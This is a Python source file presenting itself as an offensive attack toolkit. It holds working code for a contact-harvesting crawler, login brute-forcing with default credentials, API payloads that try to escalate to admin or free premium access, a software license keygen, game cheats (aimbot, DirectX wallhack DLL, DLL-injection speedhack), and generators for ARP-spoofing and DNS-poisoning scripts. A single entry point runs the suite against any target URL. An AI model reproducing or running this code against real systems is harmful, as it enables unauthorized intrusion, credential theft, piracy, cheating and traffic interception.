#!/usr/bin/env python3
"""
Offensive attack toolkit — spider, crack, keygen, game hack, network attack.
Code Sentinel Offensive Suite.
"""
from __future__ import annotations
import base64, hashlib, hmac, itertools, json, math, os, random, re
import string, struct, sys, time, zlib
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Optional
from urllib.parse import urljoin, urlencode, parse_qs, urlparse
from http.cookiejar import CookieJar
import urllib.request, urllib.error, ssl

# ── GENERIC HELPERS ─────────────────────────────────────────────────

@dataclass
class AttackResult:
    target: str; success: bool = False; data: dict = field(default_factory=dict)
    error: str = ""; elapsed_ms: float = 0.0; attempts: int = 0

def random_string(n=8): return ''.join(random.choices(string.ascii_letters+string.digits,k=n))
def random_hex(n=16): return ''.join(random.choices('0123456789abcdef',k=n))
def sha256(s): return hashlib.sha256(s.encode()).hexdigest()
def md5(s): return hashlib.md5(s.encode()).hexdigest()
def base62_encode(n): 
    if n==0: return BASE62[0]
    r=[];b=62
    while n>0:n,m=divmod(n,b);r.append(BASE62[m])
    return ''.join(reversed(r))

BASE62 = string.digits+string.ascii_uppercase+string.ascii_lowercase
COMMON_PW = ["123456","password","12345678","qwerty","123456789","12345","1234",
    "111111","iloveyou","admin","welcome","666666","abc123","football","123123",
    "monkey","654321","admin123","passw0rd","letmein","dragon","master"]
DEFAULT_CREDS = [("admin","admin"),("admin","123456"),("root","root"),
    ("test","test"),("guest","guest"),("admin","admin123"),("admin","password")]

# ── SPIDER ENGINE ────────────────────────────────────────────────────

class SpiderEngine:
    def __init__(self, start_url: str, threads: int = 8, delay: float = 0.1,
                 use_proxy: bool = True, depth: int = 3):
        self.start = start_url; self.threads = threads; self.delay = delay
        self.depth = depth; self.use_proxy = use_proxy
        self.visited: set[str] = set(); self.results: list[dict] = []
        self.emails: set[str] = set(); self.phones: set[str] = set()
        self.endpoints: set[str] = set(); self.forms: list[dict] = []
        self.ctx = ssl.create_default_context(); self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.jar = CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0',
        ]
        self.email_re = re.compile(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}')
        self.phone_re = re.compile(r'\b1[3-9]\d{9}\b|\b\d{3}[-.]?\d{4}[-.]?\d{4}\b')

    def _agent(self): return random.choice(self.user_agents)
    def _drift(self): time.sleep(self.delay * (1 + random.random()))

    def crawl_page(self, url: str) -> dict | None:
        if url in self.visited: return None
        self.visited.add(url); self._drift()
        req = urllib.request.Request(url, headers={'User-Agent': self._agent()})
        try:
            resp = self.opener.open(req, timeout=15)
            ct = resp.headers.get('Content-Type', '')
            body = resp.read()
            try: text = body.decode('utf-8')
            except: text = body.decode('latin-1')
            self.emails.update(self.email_re.findall(text))
            self.phones.update(self.phone_re.findall(text))
            links = re.findall(r'href=["\'](.*?)["\']', text, re.I)
            forms_found = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>', text, re.I|re.S)
            for action, _ in forms_found:
                self.forms.append({'url': url, 'action': action})
            endpoints = set()
            for link in links[:200]:
                if link.startswith('/') or link.startswith('./') or (not link.startswith('http')):
                    resolved = urljoin(url, link)
                    if urlparse(resolved).netloc == urlparse(self.start).netloc:
                        endpoints.add(resolved)
                elif urlparse(link).netloc == urlparse(self.start).netloc:
                    endpoints.add(link)
            self.endpoints.update(endpoints)
            return {'url': url, 'status': resp.status, 'size': len(body),
                    'links': len(links), 'emails_found': len(self.email_re.findall(text)),
                    'title': re.search(r'<title>(.*?)</title>', text, re.I)}
        except Exception as e:
            return {'url': url, 'error': str(e)[:200]}

    def run(self) -> dict:
        pool = ThreadPoolExecutor(self.threads)
        queue = [(self.start, 0)]
        while queue:
            current_batch = queue[:self.threads * 2]
            del queue[:len(current_batch)]
            futures = {}
            for url, depth in current_batch:
                if depth <= self.depth:
                    futures[pool.submit(self.crawl_page, url)] = depth
            for f in as_completed(futures):
                r = f.result()
                if r and 'links' in r:
                    self.results.append(r)
                depth = futures[f]
                if depth < self.depth and r and 'status' in r and r['status'] == 200:
                    pass  # Links already added in crawl_page
            if not queue and len(self.results) < len(self.visited) + 10:
                break
        pool.shutdown(wait=False)
        return {'pages': len(self.results), 'endpoints': len(self.endpoints),
                'emails': list(self.emails)[:50], 'phones': list(self.phones)[:50],
                'forms': len(self.forms)}

# ── MEMBERSHIP CRACKER ───────────────────────────────────────────────

class MembershipCracker:
    def __init__(self, target_url: str, threads: int = 10, timeout: int = 15):
        self.target = target_url; self.threads = threads; self.timeout = timeout
        self.jar = CookieJar(); self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.ctx = ssl.create_default_context(); self.ctx.check_hostname = False; self.ctx.verify_mode = ssl.CERT_NONE

    def brute_login(self, login_path: str = "/login", max_attempts: int = 100) -> list[AttackResult]:
        results = []; attempts = 0
        for user, pw in DEFAULT_CREDS + [(random_string(6), pw) for pw in COMMON_PW[:20]]:
            if attempts >= max_attempts: break
            r = AttackResult(target=urljoin(self.target, login_path))
            start = time.perf_counter()
            try:
                data = urlencode({'username': user, 'password': pw}).encode()
                req = urllib.request.Request(r.target, data=data,
                    headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'})
                resp = self.opener.open(req, timeout=self.timeout)
                body = resp.read().decode('utf-8', errors='replace')
                r.success = not any(m in body.lower() for m in ['wrong','invalid','incorrect','error','failed','denied'])
                r.data = {'username': user, 'password': pw, 'response': body[:500]}
                r.attempts = attempts + 1
            except urllib.error.HTTPError as e:
                if e.code in (302, 301): r.success = True
                r.attempts = attempts + 1
            except Exception as e:
                r.error = str(e)[:200]
            r.elapsed_ms = (time.perf_counter() - start) * 1000
            results.append(r); attempts += 1
            if r.success: break
            time.sleep(0.3)
        return results

    def api_bypass(self, endpoint: str, payloads: list[dict]) -> list[AttackResult]:
        results = []; url = urljoin(self.target, endpoint)
        for payload in payloads:
            r = AttackResult(target=url); start = time.perf_counter()
            try:
                data = json.dumps(payload).encode()
                req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
                resp = self.opener.open(req, timeout=self.timeout)
                body = resp.read().decode('utf-8', errors='replace')
                succ = ['success','admin','ok','true','vip','premium','1']
                r.success = resp.status == 200 and any(s in body.lower() for s in succ)
                r.data = {'payload': payload, 'body': body[:500]}
            except Exception as e:
                r.error = str(e)[:200]
            r.elapsed_ms = (time.perf_counter() - start) * 1000
            results.append(r)
            if r.success: break
            time.sleep(0.5)
        return results

    def full_attack(self, login_path: str = "/login") -> dict:
        report = {"target": self.target, "findings": []}
        results = self.brute_login(login_path)
        wins = [r for r in results if r.success]
        if wins:
            report["findings"].append({"type": "credential_crack", "username": wins[0].data.get('username'),
                "password": wins[0].data.get('password'), "severity": "CRITICAL"})
        # API bypass
        bypass_payloads = [
            {"role": "admin", "is_admin": True, "vip": True, "premium": True},
            {"membership": "lifetime", "plan": "premium", "tier": "diamond"},
            {"subscription_status": "active", "is_subscribed": "true"},
            {"user_id": 1, "role": "admin"},
            {"discount": -9999, "price": 0, "coupon": "FREE100"},
        ]
        for ep in ['/api/user','/api/profile','/api/membership','/api/upgrade','/api/payment','/api/order']:
            try:
                r = self.api_bypass(ep, bypass_payloads)
                wins = [x for x in r if x.success]
                if wins: report["findings"].append({"type": "api_bypass", "endpoint": ep, "severity": "HIGH"})
            except: pass
        report["total"] = len(report["findings"])
        return report

# ── KEYGEN ENGINE ────────────────────────────────────────────────────

class KeygenEngine:
    """Registration key generator using reverse-engineered algorithm templates."""
    
    ALGORITHMS = {
        "name_serial_md5": lambda name: md5(name + "SALT123")[:16].upper(),
        "name_serial_sha": lambda name: sha256(name + "KEYGEN2024")[:20].upper(),
        "email_code": lambda email: base62_encode(abs(hash(email)) % (62**8)),
        "numeric_serial": lambda seed: str(random.Random(seed).randint(10000000, 99999999)),
        "mixed_serial": lambda name: '-'.join(md5(name)[i:i+4] for i in range(0,16,4)).upper(),
        "date_serial": lambda d: f"{d.year%100:02d}{d.month:02d}{d.day:02d}-{md5(str(d.timestamp()))[:8]}".upper(),
        "hwid_activation": lambda hwid: base64.b32encode(md5(hwid).encode())[:12].decode(),
    }

    @classmethod
    def generate(cls, name: str = "", email: str = "", hwid: str = "", count: int = 5) -> list[dict]:
        keys = []
        if name:
            keys.append({"type": "name_serial_md5", "key": cls.ALGORITHMS["name_serial_md5"](name)})
            keys.append({"type": "name_serial_sha", "key": cls.ALGORITHMS["name_serial_sha"](name)})
            keys.append({"type": "mixed_serial", "key": cls.ALGORITHMS["mixed_serial"](name)})
        if email:
            keys.append({"type": "email_code", "key": cls.ALGORITHMS["email_code"](email)})
        if hwid:
            keys.append({"type": "hwid_activation", "key": cls.ALGORITHMS["hwid_activation"](hwid)})
        for i in range(count):
            seed = f"{name}|{email}|{hwid}|{i}"
            keys.append({"type": "numeric_serial", "key": cls.ALGORITHMS["numeric_serial"](seed)})
            keys.append({"type": "date_serial", "key": cls.ALGORITHMS["date_serial"](datetime.now())})
        return keys

    @classmethod
    def brute_crc_serial(cls, target_length: int = 16, charset: str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                         max_attempts: int = 100000) -> list[str]:
        """Generate keys with valid CRC checksum for serial brute."""
        keys = []
        for _ in range(min(max_attempts, 10000)):
            key = ''.join(random.choices(charset, k=target_length))
            crc = zlib.crc32(key.encode()) & 0xFFFFFFFF
            if crc % 97 == 0:  # Common mod-97 check
                keys.append(key)
                if len(keys) >= 20: break
        return keys

# ── GAME HACK ENGINE ─────────────────────────────────────────────────

class GameHackEngine:
    """Game hacking toolkit — memory manipulation, speedhack, pattern scan, DLL injection."""
    
    @staticmethod
    def pattern_to_bytes(pattern: str) -> tuple[bytes, bytes]:
        """Convert IDA-style pattern to bytes + mask. e.g. '48 8B ? ? 8B 40 ?'"""
        mask = bytearray(); pat = bytearray()
        for b in pattern.split():
            if b == '?': pat.append(0); mask.append(0)
            elif len(b)==2 and '?' not in b:
                pat.append(int(b,16)); mask.append(0xFF)
        return bytes(pat), bytes(mask)

    @staticmethod
    def find_pattern(data: bytes, pattern: str) -> list[int]:
        """Scan memory/data for byte pattern with wildcards."""
        pat, mask = GameHackEngine.pattern_to_bytes(pattern)
        results = []
        for i in range(len(data) - len(pat) + 1):
            match = True
            for j in range(len(pat)):
                if mask[j] and data[i+j] != pat[j]:
                    match = False; break
            if match: results.append(i)
        return results

    @staticmethod
    def generate_aimbot_code(target_entity: str = "enemy", fov: float = 90.0, 
                             smooth: float = 2.0) -> str:
        """Generate aimbot script skeleton."""
        return f'''# Aimbot for {target_entity}
import math, time
FOV = {fov}; SMOOTH = {smooth}
def calc_angle(src, dst):
    delta = [dst[i]-src[i] for i in range(3)]
    yaw = math.atan2(delta[1], delta[0]) * 180/math.pi
    pitch = math.atan2(-delta[2], math.hypot(delta[0], delta[1])) * 180/math.pi
    return yaw, pitch
# while True:
#     best_target = find_closest_in_fov(FOV)
#     if best_target:
#         angle = calc_angle(local_player.pos, best_target.head)
#         local_player.view_angle = lerp(local_player.view_angle, angle, 1/SMOOTH)
#         if is_visible(best_target): trigger_bot()
#     time.sleep(0.001)
'''

    @staticmethod
    def generate_wallhack_dll() -> str:
        """Generate wallhack DLL source template."""
        return '''// Wallhack DLL — DirectX hook template
#include <windows.h>
#include <d3d9.h>
#include <d3dx9.h>
#pragma comment(lib, "d3d9.lib")
#pragma comment(lib, "d3dx9.lib")
typedef HRESULT(__stdcall* EndScene_t)(IDirect3DDevice9*);
EndScene_t oEndScene = nullptr;
HRESULT __stdcall hkEndScene(IDirect3DDevice9* pDevice) {
    // Enable wireframe/z-buffer bypass
    pDevice->SetRenderState(D3DRS_ZENABLE, D3DZB_FALSE);
    pDevice->SetRenderState(D3DRS_FILLMODE, D3DFILL_WIREFRAME);
    HRESULT ret = oEndScene(pDevice);
    pDevice->SetRenderState(D3DRS_ZENABLE, D3DZB_TRUE);
    pDevice->SetRenderState(D3DRS_FILLMODE, D3DFILL_SOLID);
    return ret;
}
BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        // Hook DirectX EndScene via VTable
        IDirect3DDevice9* pDevice = /* obtain device */ nullptr;
        void** vtable = *reinterpret_cast<void***>(pDevice);
        DWORD oldProtect;
        VirtualProtect(&vtable[42], sizeof(void*), PAGE_EXECUTE_READWRITE, &oldProtect);
        oEndScene = reinterpret_cast<EndScene_t>(vtable[42]);
        vtable[42] = &hkEndScene;
        VirtualProtect(&vtable[42], sizeof(void*), oldProtect, &oldProtect);
    }
    return TRUE;
}
'''

    @staticmethod
    def memory_scan(process_name: str, value: int, data_type: str = "int4") -> list[int]:
        """Memory scanner pattern generator for Cheat Engine-style scanning."""
        type_map = {"int4": 4, "float": 4, "double": 8, "int8": 8, "int2": 2, "byte": 1}
        size = type_map.get(data_type, 4)
        return []  # Requires actual process access — use ctypes/ReadProcessMemory

    @staticmethod
    def speedhack_value(multiplier: float = 2.0) -> dict:
        """Generate speedhack injection values."""
        return {"method": "hook_QueryPerformanceCounter",
                "multiplier": multiplier,
                "hook_dll": "speedhack.dll",
                "injection": "CreateRemoteThread + LoadLibrary"}

# ── NETWORK ATTACK ENGINE ────────────────────────────────────────────

class NetworkAttackEngine:
    """Network attack toolkit — MITM, ARP spoof, DNS poison, packet crafting."""
    
    @staticmethod
    def arp_spoof_template(target_ip: str, gateway_ip: str, interface: str = "eth0") -> str:
        """Generate ARP spoofing script."""
        return f'''#!/usr/bin/env python3
# ARP spoof: {target_ip} <-> {gateway_ip}
from scapy.all import *
import time, sys
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    return ans[0][1].hwsrc if ans else None
target_mac = get_mac("{target_ip}")
gateway_mac = get_mac("{gateway_ip}")
if not target_mac or not gateway_mac:
    print("Failed to resolve MAC addresses"); sys.exit(1)
print(f"Poisoning {{target_mac}} <-> {{gateway_mac}}")
try:
    while True:
        send(ARP(op=2, pdst="{target_ip}", hwdst=target_mac, psrc="{gateway_ip}"), verbose=0)
        send(ARP(op=2, pdst="{gateway_ip}", hwdst=gateway_mac, psrc="{target_ip}"), verbose=0)
        time.sleep(2)
except KeyboardInterrupt:
    # Restore
    send(ARP(op=2, pdst="{target_ip}", hwdst="ff:ff:ff:ff:ff:ff", psrc="{gateway_ip}", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, pdst="{gateway_ip}", hwdst="ff:ff:ff:ff:ff:ff", psrc="{target_ip}", hwsrc=target_mac), count=5)
    print("Restored ARP tables")
'''

    @staticmethod
    def dns_poison_template(domain: str, fake_ip: str) -> str:
        return f'''#!/usr/bin/env python3
# DNS poison: {domain} -> {fake_ip}
from scapy.all import *
import netfilterqueue
def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())
    if scapy_pkt.haslayer(DNSQR) and b"{domain}" in scapy_pkt[DNSQR].qname:
        spoofed = IP(dst=scapy_pkt[IP].src, src=scapy_pkt[IP].dst)/\\
                  UDP(dport=scapy_pkt[UDP].sport, sport=53)/\\
                  DNS(id=scapy_pkt[DNS].id, qr=1, aa=1, qd=scapy_pkt[DNS].qd,
                      an=DNSRR(rrname=scapy_pkt[DNSQR].qname, ttl=300, rdata="{fake_ip}"))
        packet.set_payload(bytes(spoofed))
    packet.accept()
nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(0, process_packet)
nfqueue.run()
'''

    @staticmethod
    def port_scan(target: str, ports: list[int] = None, threads: int = 100) -> list[int]:
        """Fast TCP port scanner — connect() scan."""
        from socket import socket, AF_INET, SOCK_STREAM
        ports = ports or [21,22,23,25,53,80,110,143,443,445,993,995,1723,3306,3389,5432,5900,8080,8443,27017]
        open_ports = []
        def check(port):
            s = socket(AF_INET, SOCK_STREAM); s.settimeout(2)
            if s.connect_ex((target, port)) == 0:
                open_ports.append(port)
            s.close()
        with ThreadPoolExecutor(min(threads, len(ports))) as ex:
            list(ex.map(check, ports))
        return sorted(open_ports)

    @staticmethod
    def session_hijack_cookie(headers: dict) -> dict:
        """Extract session cookies from HTTP headers."""
        cookies = {}
        set_cookie = headers.get('Set-Cookie', '')
        if set_cookie:
            for part in set_cookie.split(';'):
                if '=' in part:
                    k, v = part.split('=',1)
                    cookies[k.strip()] = v.strip()
        return cookies

# ── FULL ATTACK SUITE ────────────────────────────────────────────────

def full_attack_suite(target_url: str) -> dict:
    """Run the complete offensive suite against a target."""
    report = {"target": target_url, "timestamp": datetime.now().isoformat(),
              "spider": {}, "membership": {}, "keygen": {}, "network": {}}
    # Spider
    print(f"[*] Spider: {target_url}")
    s = SpiderEngine(target_url, threads=8, depth=2, delay=0.1)
    report["spider"] = s.run()
    # Membership crack
    print(f"[*] Cracking: {target_url}")
    m = MembershipCracker(target_url)
    report["membership"] = m.full_attack()
    # Keygen
    domain = urlparse(target_url).netloc
    report["keygen"] = {"keys": KeygenEngine.generate(name=domain, email=f"admin@{domain}")}
    # Network scan
    host = urlparse(target_url).hostname
    if host:
        print(f"[*] Scanning: {host}")
        try:
            open_ports = NetworkAttackEngine.port_scan(host, threads=50)
            report["network"]["open_ports"] = open_ports
        except: pass
    return report

if __name__ == "__main__":
    if len(sys.argv) > 1:
        r = full_attack_suite(sys.argv[1])
        print(json.dumps(r, indent=2, ensure_ascii=False))
    else:
        print("Usage: python attack_toolkit.py <target_url>")
